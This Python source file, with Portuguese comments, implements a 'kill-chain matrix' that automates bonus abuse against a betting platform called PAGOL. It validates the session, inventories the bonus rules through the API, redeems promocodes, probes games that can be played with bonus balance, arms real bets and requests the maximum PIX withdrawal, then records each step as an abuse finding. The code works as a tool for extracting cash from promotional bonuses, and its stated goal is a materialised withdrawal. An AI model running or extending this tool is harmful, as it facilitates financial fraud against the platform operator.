"""
Kill-chain matrix — cerca tudo que o lab consegue automatizar para
escalar bônus → maximizar conversão → materializar saque.

Cada estágio declara mode:
  AUTOMATED  — script executa sozinho
  SEMI_AUTO  — script arma; humano completa (ex.: spin/stake no provider)
  MANUAL     — só operador/BO (fora do script)
  BLOCKED    — gate da casa impede o passo
  SKIPPED    — não pedido nesta run (flags)
"""

from __future__ import annotations

from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from typing import Any, Optional
from uuid import uuid4

from src.abuse.oracle import WithdrawalOracle, classify_conversion
from src.models.abuse import AbuseFinding, AbuseSeverity, ConversionStatus
from src.scrapers.pagol_scraper import PagolScraper


@dataclass
class MatrixStageResult:
    id: str
    title: str
    mode: str  # AUTOMATED | SEMI_AUTO | MANUAL | BLOCKED | SKIPPED
    ok: bool
    severity: str = "info"
    vulnerability: str = ""
    note: str = ""
    gates: list[str] = field(default_factory=list)
    evidence: dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        return asdict(self)


class KillChainMatrix:
    """
    Runner PAGOL: inventário → probes → estratégia de max valor →
    saque (opt) → settle BO.
    """

    def __init__(
        self,
        scraper: PagolScraper,
        *,
        oracle: Optional[WithdrawalOracle] = None,
        findings: Any = None,
    ):
        self.scraper = scraper
        self.oracle = oracle or WithdrawalOracle(scraper, findings=findings)
        self.findings = findings

    def run(
        self,
        *,
        promocode: str = "",
        confirm_redeem: bool = False,
        confirm_real_withdraw: bool = False,
        settle_withdraw: bool = True,
        settle_timeout_s: int = 60,
        probe_high_ev: bool = True,
        probe_slots: bool = True,
        arm_wager_poll: bool = False,
        poll_seconds: int = 20,
        high_ev_limit: int = 4,
        slots_limit: int = 3,
        persist_findings: bool = True,
    ) -> dict[str, Any]:
        run_id = str(uuid4())
        started = datetime.now(timezone.utc)
        stages: list[MatrixStageResult] = []

        def add(stage: MatrixStageResult) -> None:
            stages.append(stage)

        # 1) Auth
        try:
            auth = self.scraper.validate_token()
            add(
                MatrixStageResult(
                    id="auth",
                    title="Validar sessão API",
                    mode="AUTOMATED",
                    ok=True,
                    evidence={"user_id": auth.get("user_id"), "currency": auth.get("currency")},
                )
            )
        except Exception as exc:  # noqa: BLE001
            add(
                MatrixStageResult(
                    id="auth",
                    title="Validar sessão API",
                    mode="BLOCKED",
                    ok=False,
                    severity="critical",
                    vulnerability="session_expired",
                    note=str(exc)[:300],
                    gates=["not_logged_in"],
                )
            )
            return self._finalize(run_id, started, stages, persist_findings=persist_findings)

        # 2) Wallet + bonus inventory
        wallet = self.scraper.get_wallet_snapshot(include_bonus_state=True)
        bonus_state = (wallet.raw or {}).get("bonus_state") or self.scraper.get_bonus_conversion_state()
        primary = bonus_state.get("primary") if isinstance(bonus_state, dict) else None
        snap = classify_conversion(wallet, account_bonuses=int(bonus_state.get("count") or 0))
        add(
            MatrixStageResult(
                id="wallet_bonus_inventory",
                title="Inventário wallet + regras do bônus (rollover/maxBet/maxConvert/gameTypes)",
                mode="AUTOMATED",
                ok=True,
                severity="medium" if primary else "info",
                vulnerability=(
                    "bonus_rules_exposed_via_api"
                    if primary
                    else "no_active_bonus"
                ),
                note=snap.notes,
                gates=list(snap.gates),
                evidence={
                    "wallet": wallet.model_dump(mode="json"),
                    "conversion_status": snap.status.value,
                    "bonus_state": bonus_state,
                    "theoretical_max_convert_brl": bonus_state.get("theoretical_max_convert_brl"),
                    "strategy": bonus_state.get("strategy"),
                },
            )
        )

        # 3) Promocode acquire (optional)
        code = (promocode or "").strip()
        if code:
            validation = self.scraper.validate_promocode(code)
            if confirm_redeem:
                redeem = self.scraper.redeem_promocode(code, confirm_redeem=True)
                ok = bool(redeem.get("ok"))
                add(
                    MatrixStageResult(
                        id="acquire_promocode",
                        title=f"Redeem promocode {code}",
                        mode="AUTOMATED",
                        ok=ok,
                        severity="high" if ok else "info",
                        vulnerability="promocode_credit" if ok else "promocode_not_redeemable",
                        note=str(redeem.get("message") or redeem.get("error") or "")[:240],
                        evidence={"validation": validation, "redeem": redeem},
                    )
                )
                if ok:
                    wallet = self.scraper.get_wallet_snapshot(include_bonus_state=True)
                    bonus_state = (wallet.raw or {}).get("bonus_state") or {}
                    primary = bonus_state.get("primary")
            else:
                add(
                    MatrixStageResult(
                        id="acquire_promocode",
                        title=f"Validate promocode {code} (redeem não confirmado)",
                        mode="SKIPPED",
                        ok=bool(validation.get("ok") or validation.get("status") in {200, 204, None}),
                        note="confirm_redeem=false",
                        evidence={"validation": validation},
                    )
                )
        else:
            add(
                MatrixStageResult(
                    id="acquire_promocode",
                    title="Adquirir bônus via promocode",
                    mode="MANUAL",
                    ok=bool(primary),
                    severity="info",
                    vulnerability="bo_credit_or_manual_claim_required",
                    note=(
                        "Catálogo all-enabled tipicamente afiliado (promocode_not_found). "
                        "Crédito BO / INSTANT claim ainda é MANUAL."
                        if not primary
                        else "Bônus já presente — skip acquire"
                    ),
                    evidence={"has_primary_bonus": bool(primary)},
                )
            )

        # 4) High-EV soft probe
        if probe_high_ev:
            try:
                hev = self.scraper.probe_high_ev_contribution(
                    limit=high_ev_limit, include_bonus_flag=True
                )
                slots_only = bool(primary and primary.get("slots_only"))
                mismatch = slots_only and int(hev.get("probed") or 0) > 0
                add(
                    MatrixStageResult(
                        id="probe_high_ev",
                        title="Soft-probe high-EV (launch cash vs useBonusBalance)",
                        mode="AUTOMATED",
                        ok=True,
                        severity="high" if mismatch else "medium",
                        vulnerability=(
                            "high_ev_launch_ok_but_bonus_game_type_blocks_stake"
                            if mismatch
                            else "high_ev_launch_eligible"
                        ),
                        note=str(hev.get("note") or ""),
                        gates=["slots_only_bonus"] if slots_only else [],
                        evidence={
                            "probed": hev.get("probed"),
                            "findings": hev.get("findings"),
                            "probes": (hev.get("probes") or [])[:6],
                            "wallet_unchanged": hev.get("wallet_unchanged"),
                        },
                    )
                )
            except Exception as exc:  # noqa: BLE001
                add(
                    MatrixStageResult(
                        id="probe_high_ev",
                        title="Soft-probe high-EV",
                        mode="BLOCKED",
                        ok=False,
                        severity="medium",
                        note=str(exc)[:300],
                    )
                )
        else:
            add(
                MatrixStageResult(
                    id="probe_high_ev",
                    title="Soft-probe high-EV",
                    mode="SKIPPED",
                    ok=True,
                )
            )

        # 5) Slots soft probe (path real para bônus SLOTS)
        if probe_slots:
            try:
                slots = self.scraper.probe_slots_for_bonus(
                    limit=slots_limit,
                    use_bonus_balance=bool(primary and float(primary.get("balance_brl") or 0) > 0),
                )
                add(
                    MatrixStageResult(
                        id="probe_slots",
                        title="Soft-probe slots elegíveis (path de rollover real)",
                        mode="AUTOMATED",
                        ok=int(slots.get("launches_ok") or 0) > 0,
                        severity="medium",
                        vulnerability="slots_bonus_launch_ok_spin_manual",
                        note=str(slots.get("note") or ""),
                        evidence=slots,
                    )
                )
            except Exception as exc:  # noqa: BLE001
                add(
                    MatrixStageResult(
                        id="probe_slots",
                        title="Soft-probe slots",
                        mode="BLOCKED",
                        ok=False,
                        note=str(exc)[:300],
                    )
                )
        else:
            add(
                MatrixStageResult(
                    id="probe_slots", title="Soft-probe slots", mode="SKIPPED", ok=True
                )
            )

        # 6) Maximize convertible value — strategy (auto) + optional arm poll (semi)
        strategy = (bonus_state or {}).get("strategy") or {}
        remaining = float((primary or {}).get("remaining_rollover_brl") or 0.0)
        max_convert = (primary or {}).get("max_convert_brl")
        add(
            MatrixStageResult(
                id="maximize_convertible",
                title="Maximizar valor conversível (plano + teto maxConvert)",
                mode="SEMI_AUTO",
                ok=remaining <= 0 and bool(primary),
                severity="high" if remaining > 0 else "info",
                vulnerability="rollover_gate_caps_extractable_value",
                note=(
                    f"Teto teórico materializável via bônus ≈ R$ {bonus_state.get('theoretical_max_convert_brl')}. "
                    f"Auto-bet: {strategy.get('auto_bet_available')} "
                    f"({strategy.get('auto_bet_blocker')})."
                ),
                gates=[
                    g
                    for g in [
                        f"remaining_rollover={remaining}" if remaining > 0 else "",
                        f"max_convert={max_convert}" if max_convert is not None else "",
                        f"max_bet={primary.get('max_bet_brl')}" if primary else "",
                        f"game_types={primary.get('bonus_game_types')}" if primary else "",
                    ]
                    if g
                ],
                evidence={
                    "strategy": strategy,
                    "primary": primary,
                    "theoretical_max_convert_brl": bonus_state.get("theoretical_max_convert_brl"),
                    "auto_spin_implemented": False,
                    "auto_bet_spribe_implemented": False,
                },
            )
        )

        if arm_wager_poll:
            # Arma Mines só se high-EV elegível; senão arma 1º slot ok
            try:
                lab = self.scraper.run_bonus_multiplier_lab(
                    stake_brl=min(
                        float((primary or {}).get("max_bet_brl") or PagolScraper.DEFAULT_LAB_STAKE_BRL),
                        PagolScraper.MAX_LAB_STAKE_BRL,
                    ),
                    confirm_redeem=False,
                    confirm_real_bet=True,
                    use_bonus_balance=True,
                    poll_seconds=poll_seconds,
                )
                add(
                    MatrixStageResult(
                        id="arm_wager_poll",
                        title="Armar sessão + poll carteira (stake manual no provider)",
                        mode="SEMI_AUTO",
                        ok=bool(lab.get("bet_armed")),
                        severity="critical" if (lab.get("poll") or {}).get("changed") else "medium",
                        vulnerability=(
                            "wallet_delta_during_armed_window"
                            if (lab.get("poll") or {}).get("changed")
                            else "awaiting_manual_stake"
                        ),
                        note=str(lab.get("auto_bet_note") or "")[:280],
                        gates=list(lab.get("gates") or []),
                        evidence={
                            "provider_url": lab.get("provider_url"),
                            "poll": lab.get("poll"),
                            "wallet_end": lab.get("wallet_end"),
                        },
                    )
                )
            except Exception as exc:  # noqa: BLE001
                add(
                    MatrixStageResult(
                        id="arm_wager_poll",
                        title="Armar sessão + poll",
                        mode="BLOCKED",
                        ok=False,
                        note=str(exc)[:300],
                    )
                )
        else:
            add(
                MatrixStageResult(
                    id="arm_wager_poll",
                    title="Armar sessão + poll (stake manual)",
                    mode="SKIPPED",
                    ok=True,
                    note="arm_wager_poll=false — use true para SEMI_AUTO",
                )
            )

        # 7) Withdraw preflight
        try:
            pre = self.scraper.withdraw_preflight()
            have_opened = bool(pre.get("have_opened"))
            allowed = pre.get("withdrawal_allowed")
            add(
                MatrixStageResult(
                    id="withdraw_preflight",
                    title="Preflight saque PIX (methods/have_opened/pixKey)",
                    mode="AUTOMATED",
                    ok=not have_opened and allowed is not False,
                    severity="high" if have_opened or allowed is False else "info",
                    vulnerability=(
                        "have_opened_blocks_new_withdraw"
                        if have_opened
                        else (
                            "withdrawal_not_allowed"
                            if allowed is False
                            else "withdraw_preflight_ready"
                        )
                    ),
                    gates=[
                        g
                        for g in [
                            "have_opened=true" if have_opened else "",
                            "withdrawal_allowed=false" if allowed is False else "",
                            f"balance={wallet.balance}",
                            f"min={pre.get('min_withdraw')}",
                        ]
                        if g
                    ],
                    evidence={
                        "methods": pre.get("methods"),
                        "have_opened": have_opened,
                        "day_totals_brl": pre.get("day_totals_brl"),
                        "pix_type": pre.get("pix_type"),
                        "withdrawal_allowed": allowed,
                        "min_withdraw": pre.get("min_withdraw"),
                    },
                )
            )
        except Exception as exc:  # noqa: BLE001
            pre = {}
            add(
                MatrixStageResult(
                    id="withdraw_preflight",
                    title="Preflight saque",
                    mode="BLOCKED",
                    ok=False,
                    note=str(exc)[:300],
                )
            )

        # 8) Withdraw request (max available) — only with confirm
        withdraw_result: dict[str, Any] | None = None
        withdrawal_id: Any = None
        if confirm_real_withdraw:
            result = self.oracle.attempt_withdraw(
                amount=0,
                confirm_real_withdraw=True,
                method="PIX",
                max_amount=PagolScraper.MAX_WITHDRAW_AMOUNT,
                preflight_only=False,
                use_max_available=True,
            )
            withdraw_result = result.model_dump(mode="json")
            data = (result.response_data or {}).get("data") or {}
            withdrawal_id = data.get("withdrawalId") or data.get("id")
            add(
                MatrixStageResult(
                    id="withdraw_request",
                    title="Pedir saque máximo (API request.do)",
                    mode="AUTOMATED",
                    ok=bool(result.ok),
                    severity="high",
                    vulnerability=(
                        "api_accepts_withdraw_request"
                        if result.ok
                        else "api_rejects_withdraw_request"
                    ),
                    note=(
                        "API SUCCESS/withdraw_ok ≠ PIX materializado — "
                        "ver estágio settle."
                    ),
                    gates=list(result.gates or []),
                    evidence={
                        "amount": result.amount,
                        "code": result.code,
                        "status": result.status.value,
                        "withdrawal_id": withdrawal_id,
                        "wallet_before": result.wallet_before.model_dump(mode="json")
                        if result.wallet_before
                        else None,
                        "wallet_after": result.wallet_after.model_dump(mode="json")
                        if result.wallet_after
                        else None,
                    },
                )
            )
        else:
            add(
                MatrixStageResult(
                    id="withdraw_request",
                    title="Pedir saque máximo (API)",
                    mode="SKIPPED",
                    ok=True,
                    note="confirm_real_withdraw=false — nenhum PIX solicitado",
                    evidence={
                        "would_amount": WithdrawalOracle.resolve_max_amount(
                            wallet.balance,
                            PagolScraper.MAX_WITHDRAW_AMOUNT,
                            cents=True,
                        )
                    },
                )
            )

        # 9) Settle / materialization
        if confirm_real_withdraw and settle_withdraw and (result.ok if confirm_real_withdraw else False):
            try:
                settle = self.scraper.poll_withdrawal_settlement(
                    withdrawal_id=withdrawal_id,
                    timeout_s=settle_timeout_s,
                    interval_s=5.0,
                    expect_amount_brl=float((withdraw_result or {}).get("amount") or 0) or None,
                )
                denied = bool(settle.get("bo_denied"))
                materialized = bool(settle.get("materialized"))
                add(
                    MatrixStageResult(
                        id="withdraw_settle",
                        title="Materializar saque (poll BO status)",
                        mode="AUTOMATED",
                        ok=materialized,
                        severity="critical" if denied else ("high" if materialized else "medium"),
                        vulnerability=str(settle.get("vulnerability") or ""),
                        note=(
                            f"final_status={settle.get('final_status')} · "
                            f"api_vs_pix={settle.get('api_success_vs_pix')}"
                        ),
                        evidence=settle,
                    )
                )
            except Exception as exc:  # noqa: BLE001
                add(
                    MatrixStageResult(
                        id="withdraw_settle",
                        title="Materializar saque (poll BO)",
                        mode="BLOCKED",
                        ok=False,
                        note=str(exc)[:300],
                    )
                )
        else:
            # Still report last withdrawals for vuln surface without new request
            try:
                hist = self.scraper.list_withdrawals(0, 8)
                items = list(hist.get("items") or [])[:8]
                denied_n = sum(
                    1
                    for x in items
                    if str(x.get("status") or "").upper() in {"DENIED", "REJECTED"}
                )
                verified_n = sum(
                    1
                    for x in items
                    if str(x.get("status") or "").upper()
                    in {"VERIFIED", "APPROVED", "PAID", "COMPLETED"}
                )
                add(
                    MatrixStageResult(
                        id="withdraw_settle",
                        title="Histórico de materialização (sem novo pedido)",
                        mode="AUTOMATED",
                        ok=denied_n < 2,
                        severity="high" if denied_n >= 2 else "info",
                        vulnerability=(
                            "repeated_bo_denied_on_cash_withdraw"
                            if denied_n >= 2
                            else "withdraw_history_observed"
                        ),
                        note=f"recent denied={denied_n} verified={verified_n}",
                        evidence={
                            "items": [
                                {
                                    "id": x.get("id"),
                                    "status": x.get("status"),
                                    "amount_brl": x.get("amount_brl"),
                                }
                                for x in items
                            ]
                        },
                    )
                )
            except Exception as exc:  # noqa: BLE001
                add(
                    MatrixStageResult(
                        id="withdraw_settle",
                        title="Histórico de materialização",
                        mode="BLOCKED",
                        ok=False,
                        note=str(exc)[:300],
                    )
                )

        return self._finalize(
            run_id,
            started,
            stages,
            persist_findings=persist_findings,
            extra={
                "withdraw_result": withdraw_result,
                "bonus_state": bonus_state,
                "conversion": snap.model_dump(mode="json"),
            },
        )

    def _finalize(
        self,
        run_id: str,
        started: datetime,
        stages: list[MatrixStageResult],
        *,
        persist_findings: bool,
        extra: Optional[dict[str, Any]] = None,
    ) -> dict[str, Any]:
        vulns = [
            {
                "stage": s.id,
                "severity": s.severity,
                "vulnerability": s.vulnerability,
                "mode": s.mode,
                "note": s.note,
            }
            for s in stages
            if s.vulnerability
            and s.severity in {"medium", "high", "critical"}
        ]
        automated = [s.id for s in stages if s.mode == "AUTOMATED"]
        semi = [s.id for s in stages if s.mode == "SEMI_AUTO"]
        manual = [s.id for s in stages if s.mode == "MANUAL"]
        blocked = [s.id for s in stages if s.mode == "BLOCKED" or (not s.ok and s.mode != "SKIPPED")]

        coverage = {
            "automated_stages": automated,
            "semi_auto_stages": semi,
            "manual_stages": manual,
            "blocked_or_failed": blocked,
            "not_automatable_yet": [
                "provider_slot_auto_spin",
                "spribe_smartfox_auto_bet",
                "bo_bonus_credit_claim",
                "bo_approve_pix",
            ],
        }

        report = {
            "ok": all(s.ok or s.mode in {"SKIPPED", "MANUAL", "SEMI_AUTO"} for s in stages),
            "run_id": run_id,
            "platform": self.scraper.platform,
            "started_at": started.isoformat(),
            "finished_at": datetime.now(timezone.utc).isoformat(),
            "goal": "max_bonus_value_then_materialize_withdraw",
            "stages": [s.to_dict() for s in stages],
            "vulnerabilities": vulns,
            "coverage": coverage,
            "verdict": _verdict(stages, vulns),
            **(extra or {}),
        }

        if persist_findings and self.findings is not None:
            for v in vulns:
                if v["severity"] not in {"high", "critical", "medium"}:
                    continue
                self.findings.add(
                    AbuseFinding(
                        platform=self.scraper.platform,
                        vector=f"kill_chain_{v['stage']}",
                        severity=AbuseSeverity(v["severity"]),
                        title=f"Matrix · {v['vulnerability']}"[:160],
                        status=ConversionStatus.UNKNOWN,
                        abuse_score={"critical": 9, "high": 7, "medium": 4}.get(
                            v["severity"], 1
                        ),
                        evidence={"run_id": run_id, **v},
                    )
                )
            self.findings.add(
                AbuseFinding(
                    platform=self.scraper.platform,
                    vector="kill_chain_matrix",
                    severity=AbuseSeverity.HIGH,
                    title="Kill-chain matrix executada (bônus→max→saque)",
                    status=ConversionStatus.UNKNOWN,
                    abuse_score=6.0,
                    evidence={
                        "run_id": run_id,
                        "verdict": report["verdict"],
                        "vuln_count": len(vulns),
                        "coverage": coverage,
                    },
                )
            )
        return report


def _verdict(stages: list[MatrixStageResult], vulns: list[dict[str, Any]]) -> dict[str, Any]:
    settle = next((s for s in stages if s.id == "withdraw_settle"), None)
    maximize = next((s for s in stages if s.id == "maximize_convertible"), None)
    materializable = bool(settle and settle.ok and settle.vulnerability == "withdraw_materialized")
    return {
        "bonus_to_cash_path_clear": bool(maximize and maximize.ok),
        "pix_materialized": materializable,
        "dominant_blocker": _dominant_blocker(stages),
        "vuln_count": len(vulns),
        "summary": (
            "Saque materializado (PIX/BO OK)."
            if materializable
            else (
                "Automação cercou a superfície; barreira dominante: "
                f"{_dominant_blocker(stages)}."
            )
        ),
    }


def _dominant_blocker(stages: list[MatrixStageResult]) -> str:
    priority = [
        "session_expired",
        "withdraw_ok_api_but_bo_denied",
        "repeated_bo_denied_on_cash_withdraw",
        "rollover_gate_caps_extractable_value",
        "high_ev_launch_ok_but_bonus_game_type_blocks_stake",
        "have_opened_blocks_new_withdraw",
        "withdrawal_not_allowed",
        "bo_credit_or_manual_claim_required",
        "awaiting_manual_stake",
        "slots_bonus_launch_ok_spin_manual",
    ]
    seen = {s.vulnerability for s in stages if s.vulnerability}
    for p in priority:
        if p in seen:
            return p
    return next(iter(seen), "none")


def run_pagol_matrix(scraper: PagolScraper, **kwargs: Any) -> dict[str, Any]:
    return KillChainMatrix(scraper).run(**kwargs)
